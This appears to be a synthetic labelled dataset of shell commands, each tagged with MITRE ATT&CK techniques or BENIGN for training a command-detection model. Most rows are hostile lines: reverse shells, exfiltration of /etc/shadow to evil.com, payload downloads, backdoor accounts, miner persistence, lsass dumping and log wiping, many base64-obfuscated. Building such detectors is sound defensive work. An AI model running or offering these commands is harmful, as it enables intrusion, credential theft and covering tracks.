curl -s http://c2.attacker.com/beacon,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo 'bHMgLWxhIC9yb290IC9ldGMgL3Zhci93d3c=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
"bash -c ""wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443""","[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.6, 1, 1]",['T1496_Resource_Hijacking'],synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'Z2V0ZW50IHBhc3N3ZCB8IGdyZXAgLXYgbm9sb2dpbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/group | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""curl -X POST http://evil.com/collect -d @/etc/shadow | sleep 1""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -sL http://evil.com/shell.sh -o /tmp/shell.sh,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
lsb_release -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
net localgroup administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
du -sh /var/log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nmap  --script=vuln  10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo 'JGVudjpjbWQgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCdkd0JvQUc4QVlRQnRBR2tBJykpIDsgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
echo 'cnVudXNlciAtbCBwb3N0Z3JlcyAtYyAncHNxbCAtYyAiU0VMRUNUIHBnX3JlYWRfZmlsZShcJy9ldGMvcGFzc3dkXCcpIicgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
shred -u /var/log/auth.log | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time curl -s http://c2.attacker.com/beacon,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68' | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0.2, 0.28, 1, 1]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
sudo echo 'c3lzdGVtY3RsIGVuYWJsZSAtLW5vdyBtYWxpY2lvdXMuc2VydmljZQ==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo cat /etc/passwd | grep -v nologin | grep -v false,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.44, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
nohup echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab - &,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1496_Resource_Hijacking'],synthetic
traceroute google.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""wget --post-file=/etc/passwd http://attacker.com/receive""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"bash -c ""nmcli connection show""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
cat  /etc/passwd  |  grep  -v  nologin  |  grep  -v  false,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.4, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
sudo cat /proc/version,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
nmap  -A  -T4  192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
time w | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bHMgLWxhIC9yb290IC9ldGMgL3Zhci93d3c=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Y2F0IH4vLmF3cy9jcmVkZW50aWFscw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
nc -e /bin/bash attacker.com 80 | history -c,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"bash -c ""ss -anp""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
ss  -anp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
nohup echo 'aHlkcmEgLWwgYWRtaW4gLVAgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQgc3NoOi8vMTAuMC4wLjEgfCBlY2hvIGRvbmU=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'ZWNobyAnQHJlYm9vdCAvdG1wL2JhY2tkb29yLnNoJyB8IGNyb250YWIgLQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'ZWNobyAnJyA+IC92YXIvbG9nL3N5c2xvZw=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
nohup perl -e 'use Socket; ...' &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
sudo nbtscan 192.168.1.0/24,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
nohup bash -i >& /dev/tcp/10.0.0.99/4444 0>&1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
sudo echo 'Z2NjIGV4cGxvaXQuYyAtbyBleHBsb2l0ICYmIC4vZXhwbG9pdA==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
nmap  -A  -T4  192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
sudo echo 'Z2V0ZW50IHBhc3N3ZCB8IGdyZXAgLXYgbm9sb2dpbg==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
getent passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
cat ~/.aws/credentials,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)' | echo done","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
python3 exploit.py --target localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
xfreerdp /u:Administrator /p:Password123 /v:10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
nc  -zv  10.0.0.1  1-1000  2>&1  |  grep  succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
ifconfig -a ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo locate wp-config.php,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe && echo done,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
groups  $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
echo 'c2hyZWQgLXUgL3Zhci9sb2cvYXV0aC5sb2cgJiYgc2xlZXAgMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""grep -r 'password' /var/www/html --include='*.php' && history -c""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
at now + 1 minute <<< '/tmp/payload',"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1053_Scheduled_Task'],synthetic
nohup echo 'ZWNobyAnYmFja2Rvb3I6eDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dkIHwgaGlzdG9yeSAtYw==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1 ; echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'ZWNobyAnYmFja2Rvb3I6eDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
wmic useraccount list && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
crontab -e,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1053_Scheduled_Task'],synthetic
uname -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
sudo hostnamectl,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
procdump.exe -ma lsass.exe lsass.dmp ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find /home -name '.env' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
whoami /all,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 ; history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
net localgroup administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
$env:cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"bash -c ""echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
sudo certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.28, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo hello world,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'ZmluZCAvdmFyL2xvZyAtbmFtZSAnKi5sb2cnIC1leGVjIHRydW5jYXRlIC1zIDAge30gXDs=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'c3NoIGFkbWluQGxvY2FsaG9zdCB8IGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo who ; echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -sL http://evil.com/shell.sh -o /tmp/shell.sh,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
find  /  -writable  -type  d  2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
"time python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
time tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
"bash -c ""echo 'ZWNobyAnQHJlYm9vdCAvdG1wLy54bXIveG1yaWcgLW8gcG9vbC5taW5leG1yLmNvbScgfCBjcm9udGFiIC0=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo 'cm0gLXJmIC90bXAvKiAvdmFyL3RtcC8q' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe | > /dev/null 2>&1,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
id -Gn && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.2, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAtdiBub2xvZ2luIHwgZ3JlcCAtdiBmYWxzZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'c3VkbyAtdSB3d3ctZGF0YSBiYXNo' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow ; chmod +x /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 1]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IHN1YnByb2Nlc3M7IHN1YnByb2Nlc3MucnVuKFsnY2F0JywnL2V0Yy9zaGFkb3cnXSki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
time nbtscan 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
find / -writable -type d 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
"nohup nmap -sV -p 22,80,443 10.0.0.0/24 &","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
rm -rf /tmp/* /var/tmp/*,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
curl -sL http://evil.com/shell.sh -o /tmp/shell.sh | history -c,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
procdump.exe -ma lsass.exe lsass.dmp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet & && > /dev/null 2>&1,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
nohup uname -a &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1082_System_Information_Discovery'],synthetic
time echo 'cHl0aG9uMyAtYyAiaW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
groups $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
